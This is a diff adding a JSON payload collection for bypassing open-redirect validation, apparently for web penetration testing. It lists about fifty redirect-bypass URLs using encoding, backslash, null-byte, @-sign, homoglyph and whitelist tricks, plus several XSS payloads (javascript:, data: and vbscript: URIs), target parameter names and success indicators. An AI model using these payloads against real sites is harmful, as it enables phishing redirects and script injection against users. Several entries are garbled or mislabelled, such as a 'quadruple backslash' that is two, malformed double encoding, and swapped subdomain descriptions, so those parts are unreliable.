@@ -1,0 +1,398 @@
+{
+  "info": {
+    "name": "Open Redirect Bypass Payloads",
+    "author": "CyberDyne Security",
+    "version": "2.0",
+    "description": "Open redirect bypass payloads - URL encoding, backslash manipulation, protocol tricks, and advanced bypass techniques. 2026 Edition.",
+    "category": "Web Security",
+    "severity": "MEDIUM",
+    "owasp": "A01:2021 - Broken Access Control",
+    "references": ["CWE-601", "OWASP URL Redirector Abuse"]
+  },
+  "philosophy": "Open redirect bypass is an art. Each technique exploits a different validation weakness. Understanding the filter is key to finding the right bypass.",
+  "payloads": {
+    "url_encoding_bypass": [
+      {
+        "payload": "https://legitimate.com%2f%2fevil.com",
+        "description": "Double encoded forward slash",
+        "context": "URL parser bypass",
+        "indicator": "//evil.com after decode"
+      },
+      {
+        "payload": "https://legitimate.com%5c%5cevil.com",
+        "description": "Encoded backslashes",
+        "context": "If validation replaces \\ with /",
+        "indicator": "\\\\evilevilevil"
+      },
+      {
+        "payload": "https://legitimate.com%%32%%65%%76%%69%%6c.com",
+        "description": "Full double URL encoding",
+        "context": "Double decode scenario",
+        "indicator": "evil.com after double decode"
+      },
+      {
+        "payload": "https://legitimate.com%252f%252fevil.com",
+        "description": "Double encoded //",
+        "context": "If only single decode is sanitized",
+        "indicator": "//evil.com after decode"
+      },
+      {
+        "payload": "https://legitimate.com%2f..%2fevil.com",
+        "description": "Encoded traversal with slash",
+        "context": "Path traversal in URL",
+        "indicator": "/evil.com after parse"
+      },
+      {
+        "payload": "https://legitimate.com%2e%2e/evil.com",
+        "description": "Encoded dots with slash",
+        "context": "Double dot encoding",
+        "indicator": "../evil.com after decode"
+      }
+    ],
+    "backslash_bypass": [
+      {
+        "payload": "https://legitimate.com\\\\evil.com",
+        "description": "Quadruple backslash",
+        "context": "If validation replaces \\\\ with //",
+        "indicator": "//evil.com after replace"
+      },
+      {
+        "payload": "https://legitimate.com/..\\evil.com",
+        "description": "Mixed slash backslash",
+        "context": "Cross-platform bypass",
+        "indicator": "Path traversal mixed"
+      },
+      {
+        "payload": "https://legitimate.com/..%5cevil.com",
+        "description": "Encoded backslash in traversal",
+        "context": "Mixed encoding bypass",
+        "indicator": "Traverse with encoded \\"
+      },
+      {
+        "payload": "https://legitimate.com\\..\\evil.com",
+        "description": "Leading backslash with traversal",
+        "context": "Windows path parsing",
+        "indicator": "Start with backslash"
+      },
+      {
+        "payload": "https://legitimate.com/..%252f..%252fevil.com",
+        "description": "Double encoding with traversal",
+        "context": "Multi-layer bypass",
+        "indicator": "Deep traversal"
+      }
+    ],
+    "null_byte_bypass": [
+      {
+        "payload": "https://legitimate.com%00evil.com",
+        "description": "URL encoded null byte",
+        "context": "If validation truncates at null",
+        "indicator": "Truncated at null"
+      },
+      {
+        "payload": "https://legitimate.com%2500evil.com",
+        "description": "Double encoded null byte",
+        "context": "Double decode scenario",
+        "indicator": "Null after double decode"
+      },
+      {
+        "payload": "https://legitimate.com\u0000evil.com",
+        "description": "Unicode null byte",
+        "context": "Unicode normalization bypass",
+        "indicator": "Null character injection"
+      },
+      {
+        "payload": "https://legitimate.com%00%2f%2fevil.com",
+        "description": "Null byte with traversal",
+        "context": "Truncation + bypass",
+        "indicator": "Truncated then traversal"
+      }
+    ],
+    "tab_newline_bypass": [
+      {
+        "payload": "https://legitimate.com%09evil.com",
+        "description": "Tab character in domain",
+        "context": "If tab is stripped but not validated",
+        "indicator": "Tab injection"
+      },
+      {
+        "payload": "https://legitimate.com%0aevil.com",
+        "description": "LF character in domain",
+        "context": "If newline is stripped",
+        "indicator": "Newline injection"
+      },
+      {
+        "payload": "https://legitimate.com%0devil.com",
+        "description": "CR character in domain",
+        "context": "If CR is stripped",
+        "indicator": "Carriage return injection"
+      },
+      {
+        "payload": "https://legitimate.com/%0a/..%2fevil.com",
+        "description": "Newline with traversal",
+        "context": "Bypass via whitespace",
+        "indicator": "Newline + traversal"
+      }
+    ],
+    "protocol_bypass": [
+      {
+        "payload": "//https://evil.com",
+        "description": "Protocol confusion - //https://",
+        "context": "Relative URL parsing",
+        "indicator": "https://evil.com interpreted"
+      },
+      {
+        "payload": "///https://evil.com",
+        "description": "Triple slash with protocol",
+        "context": "Extra slash bypass",
+        "indicator": "Protocol after triple slash"
+      },
+      {
+        "payload": "javascript://https://evil.com%0aalert(1)",
+        "description": "JavaScript protocol with CRLF",
+        "context": "XSS via JS protocol",
+        "indicator": "JavaScript execution",
+        "severity": "CRITICAL"
+      },
+      {
+        "payload": "data:text/html,<script>alert(1)</script>",
+        "description": "Data URI with script",
+        "context": "If data: URLs are not blocked",
+        "indicator": "XSS via data URI",
+        "severity": "CRITICAL"
+      },
+      {
+        "payload": "vbscript:alert(1)",
+        "description": "VBScript protocol (legacy)",
+        "context": "IE11 and older",
+        "indicator": "VBScript execution"
+      }
+    ],
+    "fragment_bypass": [
+      {
+        "payload": "https://legitimate.com#https://evil.com",
+        "description": "Fragment with full URL",
+        "context": "If validation checks before fragment",
+        "indicator": "Fragment contains URL"
+      },
+      {
+        "payload": "https://legitimate.com#//evil.com",
+        "description": "Fragment with protocol-relative",
+        "context": "Fragment bypass",
+        "indicator": "//evil.com in fragment"
+      },
+      {
+        "payload": "https://legitimate.com#///evil.com",
+        "description": "Fragment with triple slash",
+        "context": "Fragment bypass enhanced",
+        "indicator": "///evil.com in fragment"
+      },
+      {
+        "payload": "https://legitimate.com#javascript:alert(1)",
+        "description": "Fragment with JS protocol",
+        "context": "If fragment not validated",
+        "indicator": "JS in fragment",
+        "severity": "CRITICAL"
+      }
+    ],
+    "parameter_pollution": [
+      {
+        "payload": "https://legitimate.com?redirect=https://evil.com",
+        "description": "Redirect parameter injection",
+        "context": "If param not validated",
+        "indicator": "Malicious redirect param"
+      },
+      {
+        "payload": "https://legitimate.com?next=legitimate.com&next=https://evil.com",
+        "description": "Duplicate parameter with evil value last",
+        "context": "Last value wins scenario",
+        "indicator": "Last param used"
+      },
+      {
+        "payload": "https://legitimate.com?next=https://legitimate.com%26next%3dhttps://evil.com",
+        "description": "Parameter pollution via encoding",
+        "context": "Parameter parsing confusion",
+        "indicator": "Nested parameter injection"
+      }
+    ],
+    "double_redirect": [
+      {
+        "payload": "https://legitimate.com/redirect?url=https://intermediate.com/redirect?url=https://evil.com",
+        "description": "Chain of redirects",
+        "context": "Multiple redirect endpoints",
+        "indicator": "Redirect chain"
+      },
+      {
+        "payload": "https://legitimate.com/redirect?url=https://tinyurl.com/evil",
+        "description": "URL shortener as intermediate",
+        "context": "If shorteners not blocked",
+        "indicator": "Shortened malicious URL"
+      },
+      {
+        "payload": "https://legitimate.com/redirect?url=https://legitimate.com.evil.com",
+        "description": "Typosquatting domain",
+        "context": "If exact match not validated",
+        "indicator": "Fake legitimate subdomain"
+      }
+    ],
+    "unicode_bypass": [
+      {
+        "payload": "https://lеgitimate.com",
+        "description": "Cyrillic 'е' instead of 'e'",
+        "context": "Homoglyph attack - Unicode confusables",
+        "indicator": "Unicode domain spoofing"
+      },
+      {
+        "payload": "https://legіtime.com",
+        "description": "Ukrainian 'і' instead of 'i'",
+        "context": "Homoglyph attack",
+        "indicator": "Unicode i spoofing"
+      },
+      {
+        "payload": "https://legit\u00ADimate.com",
+        "description": "Soft hyphen in domain",
+        "context": "U+00AD hyphenation point",
+        "indicator": "Hidden hyphenation"
+      },
+      {
+        "payload": "https://legit\u002e\u002ecom",
+        "description": "Periods separated",
+        "context": "If dots are normalized",
+        "indicator": "Separated dots"
+      },
+      {
+        "payload": "https://legitimate。com",
+        "description": "Ideographic full stop (U+3002)",
+        "context": "Chinese/Japanese period",
+        "indicator": "Unicode period"
+      }
+    ],
+    "special_characters_bypass": [
+      {
+        "payload": "https://legitimate.com@evil.com",
+        "description": "At-sign credentials injection",
+        "context": "If @ is not validated",
+        "indicator": "@evil.com overrides legitimate"
+      },
+      {
+        "payload": "https://legitimate.com:@evil.com",
+        "description": "At-sign with empty credentials",
+        "context": "Empty user, attacker host",
+        "indicator": "@evil.com"
+      },
+      {
+        "payload": "https://legitimate.com#.com@evil.com",
+        "description": "Fragment with @ injection",
+        "context": "If fragment not sanitized",
+        "indicator": "Fragment then @"
+      },
+      {
+        "payload": "https://legitimate.com/..%2f..%2fevil.com",
+        "description": "Multiple path traversals",
+        "context": "Deep traversal",
+        "indicator": "Traversal out of sandbox"
+      },
+      {
+        "payload": "https://legitimate.com/../../../evil.com",
+        "description": "Excessive traversal",
+        "context": "Out of web root",
+        "indicator": "Path escapes"
+      }
+    ],
+    "whitelisted_domain_bypass": [
+      {
+        "payload": "https://evil.com.legitimate.com",
+        "description": "Whitelisted domain as suffix",
+        "context": "If validation checks suffix only",
+        "indicator": "Evil.com as subdomain"
+      },
+      {
+        "payload": "https://legitimate.com.evil.com",
+        "description": "Legitimate as subdomain of evil",
+        "context": "Suffix whitelist bypass",
+        "indicator": "Legit as subdomain"
+      },
+      {
+        "payload": "https://legitimatelegitimate.com",
+        "description": "Legitimate concatenated",
+        "context": "If whitelist is substring",
+        "indicator": "Contains legitimate"
+      },
+      {
+        "payload": "https://notlegitimate.com",
+        "description": "Contains 'legitimate' substring",
+        "context": "Weak contains check",
+        "indicator": "Fake legitimate"
+      },
+      {
+        "payload": "https://legit1mate.com",
+        "description": "Number substitution",
+        "context": "Visual similarity",
+        "indicator": "legit1mate vs legitimate"
+      }
+    ],
+    "mixed_case_bypass": [
+      {
+        "payload": "HTTPS://LEGITIMATE.COM",
+        "description": "All uppercase",
+        "context": "Case-sensitive validation",
+        "indicator": "Case mismatch"
+      },
+      {
+        "payload": "Https://legitimate.com",
+        "description": "Mixed case protocol",
+        "context": "Case-sensitive protocol",
+        "indicator": "Protocol case bypass"
+      },
+      {
+        "payload": "HTTPS://LEGITIMATE.COM%2F%2FEVIL.COM",
+        "description": "Uppercase with encoded //",
+        "context": "Case + encoding bypass",
+        "indicator": "Mixed bypass"
+      }
+    ],
+    "idn_homograph_bypass": [
+      {
+        "payload": "https://xn--legitimate-9f.com",
+        "description": "Punycode encoding",
+        "context": "If IDN not decoded before check",
+        "indicator": "Punycode domain"
+      },
+      {
+        "payload": "https://lеgitimate.com (using Cyrillic е)",
+        "description": "Cyrillic homograph",
+        "context": "Unicode normalization",
+        "indicator": "Cyrillic e character"
+      },
+      {
+        "payload": "https://googIe.com (using capital I)",
+        "description": "Capital I vs lowercase l",
+        "context": "Visual confusion",
+        "indicator": "GoogIe vs Google"
+      }
+    ]
+  },
+  "detection_patterns": [
+    "redirect",
+    "destination",
+    "url",
+    "uri",
+    "next",
+    "redir",
+    "return",
+    "continue",
+    "callback"
+  ],
+  "common_redirect_parameters": [
+    "redirect", "redirect_to", "redirect_uri", "url", "callback",
+    "return", "return_to", "returnUrl", "continue", "next",
+    "dest", "destination", "out", "view", "feed", "goto",
+    "error", "failed", "success", "ref", "referrer", "c"
+  ],
+  "success_indicators": [
+    "302/301 redirect to evil.com",
+    "Location header contains evil domain",
+    "Meta refresh to evil.com",
+    "JavaScript redirect to evil.com",
+    "Open redirect in logs"
+  ]
+}
